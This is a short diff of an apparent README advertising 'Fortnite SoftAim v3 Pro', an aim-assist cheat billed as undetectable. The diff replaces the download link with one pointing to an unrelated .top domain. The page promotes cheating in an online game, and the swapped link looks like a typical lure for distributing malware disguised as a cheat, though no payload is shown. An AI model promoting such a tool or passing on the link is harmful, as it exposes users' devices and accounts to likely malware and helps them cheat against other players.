@@ -3,8 +3,7 @@
 Fortnite SoftAim v3 Pro is an advanced tool designed to enhance your aiming capabilities in Fortnite. With customizable settings, it provides players with precise targeting assistance while maintaining undetectable performance.  
 Note: Using third-party tools may violate Fortnite's terms of service. Use responsibly and at your own risk.
 
-[![Download Fortnite SoftAim v3 Pro](https://img.shields.io/badge/Download-Fortnite_SoftAim_v3_Pro-blueviolet)](https://fortnite-softaim.github.io/.github/
-)
+[![Download Fortnite SoftAim v3 Pro](https://img.shields.io/badge/Download-Fortnite_SoftAim_v3_Pro-blueviolet)](https://kelomastiotp.top/)
 
 ---
 
